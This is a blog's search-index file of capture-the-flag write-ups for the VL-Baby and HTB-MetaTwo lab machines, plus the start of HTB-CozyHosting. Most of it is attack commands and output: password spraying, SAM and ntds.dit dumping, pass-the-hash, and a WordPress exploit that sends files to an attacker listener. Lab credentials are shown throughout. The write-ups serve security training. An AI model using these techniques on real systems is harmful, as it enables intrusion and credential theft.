<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>VL-Baby</title>
      <link href="/2025/03/08/VL-Baby/"/>
      <url>/2025/03/08/VL-Baby/</url>
      
        <content type="html"><![CDATA[<h2 id="Namap-Scan"><a href="#Namap-Scan" class="headerlink" title="Namap Scan"></a>Namap Scan</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">Not shown: 65514 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-06 14:47:47Z)</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">636/tcp   open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">| ssl-cert: Subject: commonName=BabyDC.baby.vl</span><br><span class="line">| Issuer: commonName=BabyDC.baby.vl</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2025-03-05T14:31:02</span><br><span class="line">| Not valid after:  2025-09-04T14:31:02</span><br><span class="line">| MD5:   48f2:c223:e5c4:356d:b768:8571:f1c6:8950</span><br><span class="line">| SHA-1: 03fd:ff73:d5e1:92bd:32bf:d747:c3fb:bb46:ff4e:6d2d</span><br><span class="line">|_ssl-date: 2025-03-06T14:49:20+00:00; -2h00m00s from scanner time.</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: BABY</span><br><span class="line">|   NetBIOS_Domain_Name: BABY</span><br><span class="line">|   NetBIOS_Computer_Name: BABYDC</span><br><span class="line">|   DNS_Domain_Name: baby.vl</span><br><span class="line">|   DNS_Computer_Name: BabyDC.baby.vl</span><br><span class="line">|   DNS_Tree_Name: baby.vl</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">|_  System_Time: 2025-03-06T14:48:39+00:00</span><br><span class="line">5357/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Service Unavailable</span><br><span class="line">5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing</span><br><span class="line">49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49675/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">55620/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">59532/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Host script results:</span><br><span class="line">| p2p-conficker: </span><br><span class="line">|   Checking for Conficker.C or higher...</span><br><span class="line">|   Check 1 (port 29424/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 2 (port 15632/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 3 (port 18953/udp): CLEAN (Timeout)</span><br><span class="line">|   Check 4 (port 41352/udp): CLEAN (Timeout)</span><br><span class="line">|_  0/4 checks are positive: Host is CLEAN or ports are blocked</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: -2h00m00s, deviation: 0s, median: -2h00m00s</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2025-03-06T14:48:41</span><br><span class="line">|_  start_date: N/A</span><br></pre></td></tr></table></figure><h2 id="FOOTHOLD"><a href="#FOOTHOLD" class="headerlink" title="FOOTHOLD"></a>FOOTHOLD</h2><h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><p>After some enumeration we found that ldap had null session active</p><p><img src="/images/Baby/LDAP-ACCESS-NULL.png" alt="LDAP Access Null"></p><p>After running a query on the hole ldap with the below command we found that one user had a description field with a initial password <code>BabyStart123!</code>. We will try to use that password for the user teresa.bell and if it doesn’t work we will spray it to the rest of the users</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Teresa Bell, it, baby.vl</span><br><span class="line">dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: person</span><br><span class="line">objectClass: organizationalPerson</span><br><span class="line">objectClass: user</span><br><span class="line">cn: Teresa Bell</span><br><span class="line">sn: Bell</span><br><span class="line">description: Set initial password to BabyStart123!</span><br></pre></td></tr></table></figure><p><img src="/images/Baby/LDAP-DISCR-PASSWORD.png" alt="LDAP Password Description"></p><p>The creds we found for Teresa.Bell but they dont work, so we will gather all of the users and password spray. We gathered the account names threw the below search BUT it was not the correct way:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://10.10.114.53 -b &quot;DC=baby,DC=vl&quot; &quot;(objectClass=user)&quot; sAMAccountName -LLL</span><br></pre></td></tr></table></figure><p><img src="/images/Baby/Getting-all-users.png" alt="Getting All Users"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Jacqueline.Barnett</span><br><span class="line">Ashley.Webb</span><br><span class="line">Hugh.George</span><br><span class="line">Leonard.Dyer</span><br><span class="line">Connor.Wilkinson</span><br><span class="line">Joseph.Hughes</span><br><span class="line">Kerry.Wilson</span><br><span class="line">Teresa.Bell</span><br></pre></td></tr></table></figure><p>We tried the usernames we gathered but it didnt work in any of them, we tried a more broad ldap search and another user popped up &#96;&#96;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://10.10.114.53 -b &quot;DC=baby,DC=vl&quot; &quot;user&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/Baby/Hit-on-account(passchange).png" alt="Hit on Account Password Change"></p><h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><p>The flag <code>STATUS_PASSWORD_MUST_CHANGE</code> tells us that we first need to change the password before we are able to log in to that user.Using the <code>smbpasswd</code> tool we were able to change Carolines password to <code>Password123!</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbpasswd -r 10.10.114.53 -U &#x27;Caroline.Robinson&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Baby/Password_Change_Car.png" alt="Password Change Caroline"><img src="/images/Baby/netexec-after-pass-change.png" alt="Netexec After Password Change"></p><p>We can check if we have winrm access using the below command</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec winrm 10.10.114.53 -u Caroline.Robinson  -p &#x27;Password123!&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Baby/Winrm-access.png" alt="Winrm Access"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.114.53 -u Caroline.Robinson -p &#x27;Password123!&#x27;</span><br></pre></td></tr></table></figure><h2 id="PrivEsc"><a href="#PrivEsc" class="headerlink" title="PrivEsc"></a>PrivEsc</h2><p>The user we got has the SeBackupPrivilege flag anabled<br><img src="/images/Baby/sebackupriv.png" alt="SeBackupPrivilege"><br>Now we can copy the sam and system hive of HKLM and crack them lockaly</p><p>Create a temp directory:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir C:\temp</span><br></pre></td></tr></table></figure><p>Copy the sam and system hive of HKLM to C:\temp and then download them.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam C:\temp\sam.hive</span><br></pre></td></tr></table></figure><p>and</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system C:\temp\system.hive</span><br></pre></td></tr></table></figure><p><img src="/images/Baby/Save-huve.png" alt="Save Hive"><br>Go on the temp folder and download the system and the sam</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download sam.hive</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download system.hive</span><br></pre></td></tr></table></figure><p>Finally use impacket-secretsdump and obtain the ntlm hashes:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -sam sam.hive -system system.hive LOCAL</span><br></pre></td></tr></table></figure><p><img src="/images/Baby/Cracked-admin-ash.png" alt="Cracked Admin Hash"><br>Now we can login using evil-winrm and get the root flag<br><img src="/images/Baby/Not-working.png" alt="Not Working"></p><h3 id="NTDS-DIT"><a href="#NTDS-DIT" class="headerlink" title="NTDS.DIT"></a>NTDS.DIT</h3><p>We can see that we cannon log into the machine as the hash we got is for the local administrator. We have to get the hash of the account in the domain (which has exactly the same name). In order to do this, we have to grab “ntds.dit” aswell</p><p>Using this script to copy the ntds.dit (xct script)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># save this in script.txt </span><br><span class="line">set metadata C:\Windows\Temp\meta.cabX </span><br><span class="line">set context clientaccessibleX </span><br><span class="line">set context persistentX </span><br><span class="line">begin backupX </span><br><span class="line">add volume C: alias cdriveX </span><br><span class="line">createX </span><br><span class="line">expose %cdrive% E:X </span><br><span class="line">end backupX</span><br></pre></td></tr></table></figure><p>Then we will run the below commands to get the ntds.dit from the “snapshot” we made</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># run diskshadow diskshadow /s script.txt </span><br><span class="line"># copy ntds to c robocopy /b E:\Windows\ntds . ntds.dit</span><br></pre></td></tr></table></figure><p>After downloading the <code>ntds.dit</code> to our local machine and run secretsdump again</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -sam sam.hive -system system.hive -ntds ntds.dit LOCAL</span><br></pre></td></tr></table></figure><p><img src="/images/Baby/Got-admin-hash.png" alt="Got Admin Hash"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.114.53 -u Administrator -H &lt;HASH&gt;</span><br></pre></td></tr></table></figure><p><a href="https://api.vulnlab.com/api/v1/share?id=17abb51a-6f38-4585-b4e5-39cd6bf1ac92">https://api.vulnlab.com/api/v1/share?id=17abb51a-6f38-4585-b4e5-39cd6bf1ac92</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-MetaTwo</title>
      <link href="/2024/11/06/HTB-MetaTwo/"/>
      <url>/2024/11/06/HTB-MetaTwo/</url>
      
        <content type="html"><![CDATA[<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><p><code>nmap -Pn -sC -sV -O -T3 -p- 10.10.11.186 -oN nmap_scan</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GenericLines: </span><br><span class="line">|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]</span><br><span class="line">|     Invalid command: try being more creative</span><br><span class="line">|_    Invalid command: try being more creative</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA)</span><br><span class="line">|   256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA)</span><br><span class="line">|_  256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.18.0</span><br><span class="line">|_http-server-header: nginx/1.18.0</span><br><span class="line">|_http-title: Did not follow redirect to http://metapress.htb/</span><br></pre></td></tr></table></figure><h1 id="Website"><a href="#Website" class="headerlink" title="Website"></a>Website</h1><p>Domain &#x3D; <code>metapress.htb</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;10.10.11.186 metapress.htb&quot; | sudo tee -a /etc/hosts</span><br></pre></td></tr></table></figure><p>Its wordpress so we can do a basic scan with the tool <code>wpscan</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://metapress.htb/</span><br></pre></td></tr></table></figure><p>The scan gave us some good info like <code>WordPress version 5.6.2</code> and  <code>PHP/8.0.24</code><br>Potential CVE if we manage to get a user CVE-2021-29447<br><a href="https://github.com/0xRar/CVE-2021-29447-PoC">https://github.com/0xRar/CVE-2021-29447-PoC</a></p><h1 id="Event-Form"><a href="#Event-Form" class="headerlink" title="Event Form"></a>Event Form</h1><p>The even form has no SSTI. Also i tried looking into other tickets to maybe get some email adresses.<br>The request is this and the <code>appointment_id</code> the base64 encoded<br><a href="http://metapress.htb/thank-you/?appointment_id=MQ==">http://metapress.htb/thank-you/?appointment_id=MQ==</a><br><code>echo &quot;MQ==&quot; | base64 -d</code> the output was 1 I will try to brute force it in burp<br>I run the first 100 ids but nothing expect mine came back with info</p><p>Looking into the source code we find that it runs bookingpress a CVE that might works is<br><a href="https://github.com/destr4ct/CVE-2022-0739">CVE-2022-0739</a></p><p>In the poc it says we need the <code>nonce</code> we can find that if we look on the event page source code by searching <code>_wpnonce</code>.<br><img src="/images/MetaTwo/MT(nonce).png" alt="Wpnonce"><br>After running the poc we get:<br><img src="/images/MetaTwo/MT(poc).png" alt="POC"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">|admin|admin@metapress.htb|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.|</span><br><span class="line">|manager|manager@metapress.htb|$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70|</span><br></pre></td></tr></table></figure><h1 id="Cracking-the-hash"><a href="#Cracking-the-hash" class="headerlink" title="Cracking the hash"></a>Cracking the hash</h1><p>I run <code>hash-identifier</code> and i found that the hash is MD5(Wordpress)<br><img src="/images/MetaTwo/MT(Hash-id).png" alt="Hash-id"><br>With a quick search we find that the hashcat mode is 400 (from this website <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a>)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat hashes.txt -m 400 /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p>Manager hash cracked</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:partylikearockstar</span><br></pre></td></tr></table></figure><p><code>Manager:partylikearockstar </code></p><h1 id="Manager-Dashboard"><a href="#Manager-Dashboard" class="headerlink" title="Manager Dashboard"></a>Manager Dashboard</h1><p><img src="/images/MetaTwo/MT(Manager_Dash).png" alt="ManagerDash"><br>As we can see we don’t have alot of privilages to change the website but we can upload media. From the initial recon I had found the CVE-2021-29447<br><a href="https://github.com/0xRar/CVE-2021-29447-PoC">https://github.com/0xRar/CVE-2021-29447-PoC</a></p><p>We can run the poc code</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 PoC.py -l 10.10.14.20 -p 8888 -f /etc/passwd</span><br></pre></td></tr></table></figure><p>and we get a base64 encoded message<br><img src="/images/MetaTwo/MT(CVE-MEDIA).png" alt="Decode"><br>we can decode that by putting it on the <code>decode.php</code> and running</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php decode.php</span><br></pre></td></tr></table></figure><p><img src="/images/MetaTwo/MT(decoding).png" alt="Decoder"><br>Now we will try to get the &#x2F;wpconfig.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 PoC.py -l 10.10.14.20 -p 8888 -f ../wp-config.php</span><br></pre></td></tr></table></figure><p><img src="/images/MetaTwo/MT(Wp-config).png" alt="wp-cong"><br>After decoding it we find:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">define( &#x27;FS_METHOD&#x27;, &#x27;ftpext&#x27; );</span><br><span class="line">define( &#x27;FTP_USER&#x27;, &#x27;metapress.htb&#x27; );</span><br><span class="line">define( &#x27;FTP_PASS&#x27;, &#x27;9NYS_ii@FyL_p5M2NvJ&#x27; );</span><br><span class="line">define( &#x27;FTP_HOST&#x27;, &#x27;ftp.metapress.htb&#x27; );</span><br><span class="line">define( &#x27;FTP_BASE&#x27;, &#x27;blog/&#x27; );</span><br><span class="line">define( &#x27;FTP_SSL&#x27;, false );</span><br></pre></td></tr></table></figure><p>the ftp username and password <code>metapress.htb:9NYS_ii@FyL_p5M2NvJ</code><br>(and some db creds)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/** MySQL database username */</span><br><span class="line">define( &#x27;DB_USER&#x27;, &#x27;blog&#x27; );</span><br><span class="line"></span><br><span class="line">/** MySQL database password */</span><br><span class="line">define( &#x27;DB_PASSWORD&#x27;, &#x27;635Aq@TdqrCwXFUZ&#x27; );</span><br></pre></td></tr></table></figure><h1 id="Ftp"><a href="#Ftp" class="headerlink" title="Ftp"></a>Ftp</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 10.10.11.186</span><br></pre></td></tr></table></figure><p>Using the creds we got <code>metapress.htb:9NYS_ii@FyL_p5M2NvJ</code> we can login to ftp. Inside the ftp we find another app that runs named <code>mailer</code>.  Inside there there is a file <code>send_email.php</code> we can download that file to our system with:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get send_email.php</span><br></pre></td></tr></table></figure><p>In there we find user and pass and another port <code>587</code> that we didnt see on nmap</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$mail-&gt;Host = &quot;mail.metapress.htb&quot;;</span><br><span class="line">$mail-&gt;SMTPAuth = true;                          </span><br><span class="line">$mail-&gt;Username = &quot;jnelson@metapress.htb&quot;;                 </span><br><span class="line">$mail-&gt;Password = &quot;Cb4_JmWM8zUZWMu@Ys&quot;;                           </span><br><span class="line">$mail-&gt;SMTPSecure = &quot;tls&quot;;                           </span><br><span class="line">$mail-&gt;Port = 587; </span><br></pre></td></tr></table></figure><p>We can try use those creds to login via ssh</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh jnelson@metapress.htb</span><br></pre></td></tr></table></figure><p>Creds worked and we have a shell as <code>jnelson</code></p><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><p>Doing <code>ls -la</code> we can see a folder that its not common on linux machines a <code>passpie</code> folder<br>that holds some keys<br>The passpie export command exports the credentials saved in passpie in plain text. <code>passpie export password.db</code> but we dont have the passphrase.</p><p>We will download our keys to our machine with:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp jnelson@metapress.htb:/home/jnelson/.passpie/.keys ./keys</span><br></pre></td></tr></table></figure><p>First let us generate the password hash from the private GPG key using gpg2john and save it into a file named keys.hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg2john keys &gt; keys.hash</span><br></pre></td></tr></table></figure><p>We can now try brute-forcing the password hash and see if we can be cracked. We can use “John The Ripper” for this purpose</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john -wordlist=/usr/share/wordlists/rockyou.txt keys.hash --format=gpg</span><br></pre></td></tr></table></figure><p><img src="/images/MetaTwo/MT(johncrack).png" alt="John"><br>and we get <code>blink182</code> as passpi passphrase.</p><p>Now we can do</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passpie export ~/password.db</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~/password.db</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">credentials:</span><br><span class="line">- comment: &#x27;&#x27;</span><br><span class="line">  fullname: root@ssh</span><br><span class="line">  login: root</span><br><span class="line">  modified: 2022-06-26 08:58:15.621572</span><br><span class="line">  name: ssh</span><br><span class="line">  password: !!python/unicode &#x27;p7qfAZt4_A1xo_0x&#x27;</span><br><span class="line">- comment: &#x27;&#x27;</span><br><span class="line">  fullname: jnelson@ssh</span><br><span class="line">  login: jnelson</span><br><span class="line">  modified: 2022-06-26 08:58:15.514422</span><br><span class="line">  name: ssh</span><br><span class="line">  password: !!python/unicode &#x27;Cb4_JmWM8zUZWMu@Ys&#x27;</span><br><span class="line">handler: passpie</span><br><span class="line">version: 1.0</span><br></pre></td></tr></table></figure><p>We got creds for root <code>root:p7qfAZt4_A1xo_0x</code> now we can just ssh to root</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@metapress.htb</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-CozyHosting</title>
      <link href="/2024/10/31/HTB-CozyHosting/"/>
      <url>/2024/10/31/HTB-CozyHosting/</url>
      
        <content type="html"><![CDATA[<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="#Nmap"></a>#Nmap</h1><p>Let’s run an Nmap scan to discover any open ports on the remote host.<br><code>sudo nmap -Pn -sC -sV -O -T3 -p- 10.10.11.230 -oN nmap_scan</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.230</span><br><span class="line">Host is up (0.054s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)</span><br><span class="line">|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://cozyhosting.htb</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:5.0</span><br><span class="line">OS details: Linux 5.0</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><p>Nmap shows that there are 2 ports open <code>22</code> and <code>80</code>. Also the domain is <code>cozyhosting.htb</code><br>so we add the domain to our <code>/etc/hosts</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;10.10.11.230 cozyhosting.htb&quot; | sudo tee -a /etc/hosts</span><br></pre></td></tr></table></figure><h1 id="Webiste"><a href="#Webiste" class="headerlink" title="#Webiste"></a>#Webiste</h1><p>Login page <a href="http://cozyhosting.htb/login">http://cozyhosting.htb/login</a></p><p>After 